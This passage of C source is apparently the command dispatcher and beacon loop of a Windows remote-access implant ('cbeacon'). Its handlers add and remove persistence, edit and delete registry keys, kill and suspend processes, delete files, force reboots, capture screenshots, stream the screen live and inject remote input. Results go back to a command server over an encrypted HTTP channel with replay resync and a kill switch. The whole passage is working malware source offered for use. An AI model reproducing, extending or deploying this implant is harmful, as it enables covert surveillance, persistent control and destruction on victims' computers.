                                            } else if (strcmp(t.type, "rename") == 0) {
                                                const char *oldp = (t.command && t.command[0]) ? t.command : t.path;
                                                const char *newp = (t.data && t.data[0]) ? t.data : t.shell;
                                                if (!oldp || !oldp[0] || !newp || !newp[0]) {
                                                    robj = emit_error_result(t.id, "rename", "rename: both current path (command) and new path (data) are required", rid);
                                                } else if (MoveFileA(oldp, newp)) {
                                                    char msg[2048]; _snprintf(msg, sizeof(msg), "renamed %s to %s", oldp, newp);
                                                    robj = emit_text_result(t.id, "rename", msg, rid);
                                                } else {
                                                    char msg[2048]; _snprintf(msg, sizeof(msg), "rename %s -> %s failed (%lu)", oldp, newp, GetLastError());
                                                    robj = emit_error_result(t.id, "rename", msg, rid);
                                                }
                                            } else if (strcmp(t.type, "delete") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                if (!pp || !pp[0]) {
                                                    robj = emit_error_result(t.id, "delete", "path required", rid);
                                                } else if (do_delete_recursive(pp) == 0) {
                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "Deleted: %s", pp);
                                                    robj = emit_text_result(t.id, "delete", msg, rid);
                                                } else {
                                                    char msg[1024]; _snprintf(msg, sizeof(msg), "delete %s failed (%lu)", pp, GetLastError());
                                                    robj = emit_error_result(t.id, "delete", msg, rid);
                                                }
} else if (strcmp(t.type, "chmod") == 0) {
    const char *pp = (t.path && t.path[0]) ? t.path : t.command;
    const char *ms0 = (t.data && t.data[0]) ? t.data : t.shell;
    const char *ms = ms0;
    if (!pp || !pp[0] || !ms || !ms[0]) {
        robj = emit_error_result(t.id, "chmod", "chmod: path (command) and octal mode (data) are required", rid);
    } else {
        char *end = NULL;
        unsigned long mv;
        if (ms[0] == '0' && (ms[1] == 'o' || ms[1] == 'O')) ms += 2;
        mv = strtoul(ms, &end, 8);
        if (!end || *end || mv > 07777) {
            char msg[256]; _snprintf(msg, sizeof(msg), "chmod: invalid octal mode \"%s\"", ms0);
            robj = emit_error_result(t.id, "chmod", msg, rid);
        } else {
            DWORD attr = GetFileAttributesA(pp);
            if (attr == INVALID_FILE_ATTRIBUTES) {
                char msg[1024]; _snprintf(msg, sizeof(msg), "chmod %s failed: cannot stat (%lu)", pp, GetLastError());
                robj = emit_error_result(t.id, "chmod", msg, rid);
            } else {
                DWORD nattr = (mv & 0222) ? (attr & ~FILE_ATTRIBUTE_READONLY) : (attr | FILE_ATTRIBUTE_READONLY);
                if (nattr == attr || SetFileAttributesA(pp, nattr)) {
                    char msg[2048]; _snprintf(msg, sizeof(msg), "set mode %s on %s", ms0, pp);
                    robj = emit_text_result(t.id, "chmod", msg, rid);
                } else {
                    char msg[1024]; _snprintf(msg, sizeof(msg), "chmod %s failed (%lu)", pp, GetLastError());
                    robj = emit_error_result(t.id, "chmod", msg, rid);
                }
            }
        }
    }
} else if (strcmp(t.type, "services") == 0) {
                                                DWORD olen = 0;
                                                char *out = do_services(&olen);
                                                if (out && *out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "services", b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                } else {
                                                    if (out) free(out);
                                                    robj = emit_error_result(t.id, "services", "services failed", rid);
                                                }
                                            } else if (strcmp(t.type, "reg_get") == 0) {
                                                const char *kk = (t.command && t.command[0]) ? t.command : t.path;
                                                DWORD olen = 0;
                                                char *out = do_reg_get(kk, &olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "reg_get", b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "reg_get", "reg query failed", rid);
                                            } else if (strcmp(t.type, "reg_set") == 0) {
                                                const char *pp = (t.path && t.path[0]) ? t.path : t.command;
                                                const char *dd = (t.data && t.data[0]) ? t.data : t.shell;
                                                int rc;
                                                if (!pp || !*pp || !dd || !*dd) {
                                                    robj = emit_error_result(t.id, "reg_set", "reg_set: path (command) and data required", rid);
                                                } else if ((rc = do_reg_set_native(pp, dd)) == 0) {
                                                    robj = emit_text_result(t.id, "reg_set", "reg set", rid);
                                                } else if (rc == -2) {
                                                    robj = emit_error_result(t.id, "reg_set", "data format: TYPE|value e.g. REG_SZ|hello", rid);
                                                } else {
                                                    robj = emit_error_result(t.id, "reg_set", "reg set failed", rid);
                                                }
                                            } else if (strcmp(t.type, "reg_delete") == 0) {
                                                const char *kk = (t.command && t.command[0]) ? t.command : t.path;
                                                if (!kk || !*kk) {
                                                    robj = emit_error_result(t.id, "reg_delete", "reg_delete: key path required", rid);
                                                } else if (do_reg_delete_native(kk) == 0) {
                                                    robj = emit_text_result(t.id, "reg_delete", "reg deleted", rid);
                                                } else {
                                                    robj = emit_error_result(t.id, "reg_delete", "reg delete failed", rid);
                                                }
                                            } else if (strcmp(t.type, "killproc") == 0) {
                                                const char *tt = (t.command && t.command[0]) ? t.command : t.path;
                                                DWORD olen = 0;
                                                char *out = do_killproc(tt, &olen);
                                                if (out) {
                                                    robj = emit_text_result(t.id, "killproc", out, rid);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "killproc", "kill failed", rid);
                                            } else if (strcmp(t.type, "suspend") == 0 || strcmp(t.type, "resume") == 0) {
                                                int is_susp = strcmp(t.type, "suspend") == 0;
                                                const char *tt = (t.command && t.command[0]) ? t.command : t.path;
                                                DWORD olen = 0;
                                                char *out = do_suspend_resume(tt, is_susp, &olen);
                                                if (out) {
                                                    robj = emit_text_result(t.id, t.type, out, rid);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, t.type, is_susp ? "suspend failed" : "resume failed", rid);
                                            } else if (strcmp(t.type, "reboot") == 0 || strcmp(t.type, "shutdown") == 0) {
                                                int is_reboot = strcmp(t.type, "reboot") == 0;
                                                DWORD olen = 0;
                                                char *out = exec_shell_full(is_reboot ? "shutdown /r /t 0" : "shutdown /s /t 0", NULL, &olen);
                                                char msg[128];
                                                if (out) free(out);
                                                _snprintf(msg, sizeof(msg), is_reboot ? "reboot initiated" : "shutdown initiated");
                                                robj = emit_text_result(t.id, t.type, msg, rid);
                                            } else if (strcmp(t.type, "persistence_add") == 0) {
                                                const char *cc = t.command ? t.command : "";
                                                const char *bar = strchr(cc, '|');
                                                char method[64] = {0};
                                                const char *args = "";
                                                char *out;
                                                if (bar) {
                                                    size_t ml = (size_t)(bar - cc);
                                                    if (ml >= sizeof(method)) ml = sizeof(method) - 1;
                                                    memcpy(method, cc, ml);
                                                    method[ml] = '\0';
                                                    args = bar + 1;
                                                } else {
                                                    _snprintf(method, sizeof(method), "%s", cc);
                                                }
                                                out = do_persist_add(method, args);
                                                robj = out ? emit_text_result(t.id, "persistence_add", out, rid) : NULL;
                                                if (out) free(out);
                                                if (!robj) robj = emit_error_result(t.id, "persistence_add", "persistence_add failed", rid);
                                            } else if (strcmp(t.type, "persistence_list") == 0) {
                                                char *out = do_persist_list();
                                                robj = out ? emit_text_result(t.id, "persistence_list", out, rid) : NULL;
                                                if (out) free(out);
                                                if (!robj) robj = emit_error_result(t.id, "persistence_list", "persistence_list failed", rid);
                                            } else if (strcmp(t.type, "persistence_remove") == 0) {
                                                const char *cc = t.command ? t.command : "";
                                                const char *bar = strchr(cc, '|');
                                                char method[64] = {0};
                                                char *out;
                                                if (bar) {
                                                    size_t ml = (size_t)(bar - cc);
                                                    if (ml >= sizeof(method)) ml = sizeof(method) - 1;
                                                    memcpy(method, cc, ml);
                                                    method[ml] = '\0';
                                                } else {
                                                    _snprintf(method, sizeof(method), "%s", cc);
                                                }
                                                out = do_persist_remove(method);
                                                robj = out ? emit_text_result(t.id, "persistence_remove", out, rid) : NULL;
                                                if (out) free(out);
                                                if (!robj) robj = emit_error_result(t.id, "persistence_remove", "persistence_remove failed", rid);
                                            } else if (strcmp(t.type, "window_list") == 0) {
                                                DWORD olen = 0;
                                                char *out = do_window_list(&olen);
                                                if (out) {
                                                    char *b64 = b64enc((const BYTE *)out, olen);
                                                    robj = b64 ? emit_b64_result(t.id, "window_list", b64, rid) : NULL;
                                                    free(b64);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "window_list", "window_list failed", rid);
                                            } else if (strcmp(t.type, "window_close") == 0) {
                                                const char *tt = (t.command && t.command[0]) ? t.command : t.path;
                                                DWORD olen = 0;
                                                char *out = do_window_close(tt, &olen);
                                                if (out) {
                                                    robj = emit_text_result(t.id, "window_close", out, rid);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "window_close", "window_close failed", rid);
                                            } else if (strcmp(t.type, "screenshot") == 0) {
                                                DWORD jlen = 0;
                                                BYTE *jpg = do_screenshot_jpeg(NULL, 65, &jlen);
                                                if (jpg && jlen > 0) {
                                                    char *b64 = b64enc(jpg, jlen);
                                                    robj = b64 ? emit_b64_result(t.id, "screenshot", b64, rid) : NULL;
                                                    free(b64);
                                                    free(jpg);
                                                } else {
                                                    if (jpg) free(jpg);
                                                    robj = emit_error_result(t.id, "screenshot", "screenshot failed", rid);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "screenshot", "screenshot failed", rid);
                                            } else if (strcmp(t.type, "screenshot_window") == 0) {
                                                const char *wnd = (t.command && t.command[0]) ? t.command : NULL;
                                                DWORD jlen = 0;
                                                BYTE *jpg = do_screenshot_jpeg(wnd, 85, &jlen);
                                                if (jpg && jlen > 0) {
                                                    char *b64 = b64enc(jpg, jlen);
                                                    robj = b64 ? emit_b64_result(t.id, "screenshot_window", b64, rid) : NULL;
                                                    free(b64);
                                                    free(jpg);
                                                } else {
                                                    if (jpg) free(jpg);
                                                    robj = emit_error_result(t.id, "screenshot_window", "screenshot failed", rid);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "screenshot_window", "screenshot failed", rid);
                                            } else if (strcmp(t.type, "screen_stream_start") == 0) {
                                                int q = parse_stream_q(t.command ? t.command : "");
                                                if (g_streaming) {
                                                    char msg[128];
                                                    _snprintf(msg, sizeof(msg), "screen stream already running (jpeg q%d, 1 frame per beacon)", g_stream_q);
                                                    robj = emit_text_result(t.id, "screen_stream_start", msg, rid);
                                                } else {
                                                    BYTE *jpg = NULL;
                                                    DWORD jlen = 0;
                                                    if (capture_jpeg(q, NULL, &jpg, &jlen) != 0 || !jpg || jlen == 0) {
                                                        if (jpg) free(jpg);
                                                        robj = emit_error_result(t.id, "screen_stream_start", "screen stream failed to start: capture failed", rid);
                                                    } else {
                                                        char msg[128];
                                                        g_streaming = 1;
                                                        g_stream_q = q;
                                                        g_stream_hash = frame_hash(jpg, jlen);
                                                        free(jpg);
                                                        _snprintf(msg, sizeof(msg), "screen stream started (jpeg q%d, 1 frame per beacon)", q);
                                                        robj = emit_text_result(t.id, "screen_stream_start", msg, rid);
                                                    }
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "screen_stream_start", "screen stream failed to start", rid);
                                            } else if (strcmp(t.type, "screen_stream_stop") == 0) {
                                                g_streaming = 0;
                                                g_stream_hash = 0;
                                                robj = emit_text_result(t.id, "screen_stream_stop", "screen stream stopped", rid);
                                            } else if (strcmp(t.type, "remote_input") == 0) {
                                                const char *err = NULL;
                                                DWORD olen = 0;
                                                char *out = do_remote_input(t.command ? t.command : "", &olen, &err);
                                                if (out) {
                                                    robj = emit_text_result(t.id, "remote_input", out, rid);
                                                    free(out);
                                                }
                                                if (!robj) robj = emit_error_result(t.id, "remote_input", err ? err : "remote_input failed", rid);
                                            } else {
                                                char msg[128];
                                                _snprintf(msg, sizeof(msg), "unsupported in C implant: %s", t.type);
                                                robj = emit_error_result(t.id, t.type, msg, rid);
                                            }
                                            if (robj) {
                                                size_t need = strlen(newres) + strlen(robj) + 2;
                                                if (need > RESULTS_CAP) { free(robj); robj = NULL; }
                                                else { char *nr = (char *)realloc(newres, need);
                                                if (nr) {
                                                    newres = nr;
                                                    if (newres[0]) strcat_s(newres, need, ",");
                                                    strcat_s(newres, need, robj);
                                                }
                                                free(robj);
                                                }
                                            }
                                            free(rid);
                                            free_task(&t);
                                            if (kill_now) {
                                                p = next ? next : p + 1;
                                                break;
                                            }
                                            p = next ? next : p + 1;
                                        }
                                    }
                                    /* Live stream: one JPEG frame per beacon while
                                     * streaming; identical frames are skipped. */
                                    if (g_streaming && newres) {
                                        BYTE *jpg = NULL;
                                        DWORD jlen = 0;
                                        if (capture_jpeg(g_stream_q, NULL, &jpg, &jlen) == 0 && jpg && jlen > 0) {
                                            unsigned long h = frame_hash(jpg, jlen);
                                            if (h != g_stream_hash) {
                                                g_stream_hash = h;
                                                results_append(&newres, emit_frame_result(jpg, jlen));
                                            }
                                            free(jpg);
                                        } else {
                                            if (jpg) free(jpg);
                                            g_streaming = 0;
                                            g_stream_hash = 0;
                                            results_append(&newres, emit_stream_error("screen stream stopped: capture failed"));
                                        }
                                    }
                                    free(results);
                                    results = newres;
                                    if (kill_now) {
                                        /* Best-effort final delivery like Go handleKill, then exit. */
                                        char *info = build_info_json();
                                        if (info) {
                                            size_t icap = strlen(results) + INFO_CAP + 512;
                                            char *inner = (char *)malloc(icap);
                                            if (inner) {
                                                unsigned long long fs = 0;
                                                char *fr = NULL;
                                                DWORD rl = 0;
                                                _snprintf(inner, icap, "{\"uuid\":\"%s\",\"pv\":2,\"info\":{%s},\"results\":[%s]}", g_uuid, info, results);
                                                fr = build_encrypted(inner, &fs);
                                                if (fr) { char *rp = http_post(fr, (DWORD)strlen(fr), &rl); if (rp) free(rp); free(fr); }
                                                free(inner);
                                            }
                                            free(info);
                                        }
                                        free(resp);
                                        free(results);
                                        ExitProcess(0);
                                    }
                                }
                            }
                        }
                    } else {
                        /* decrypt failed: drop session, re-register next loop */
                        g_have_session = 0;
                        g_registered = 0;
                    }
                }
                if (blob) free(blob);
                if (pt) free(pt);
            } else {
                /* Plaintext resync (replay rejection): {seq,ecdh_pub,mac,last_seq}.
                 * Verify MAC (regKey, uuid||seq||server_pub) like Go tryResync
                 * and fast-forward g_seq to last_seq so the next beacon is
                 * accepted instead of looping re-register/handshake. */
                char rspub[512] = {0}, rmac[512] = {0};
                unsigned long long rseq = ju64(resp, "seq");
                unsigned long long rlast = ju64(resp, "last_seq");
                if (rseq && rlast && jstring(resp, "ecdh_pub", rspub, sizeof(rspub)) && jstring(resp, "mac", rmac, sizeof(rmac)) && verify_resp_mac(rseq, rspub, rmac)) {
                    if (rlast > g_seq) { g_seq = rlast; seq_save(); }
                } else {
                    g_have_session = 0;
                    g_registered = 0;
                }
            }
            free(c64);
        }
        if (strstr(resp, "kill_switch")) {
            fprintf(stderr, "[cbeacon] kill-switch armed, exiting\n");
            free(resp);
            return 0;
        }
        free(resp);
        do_sleep_interval();
    }
}
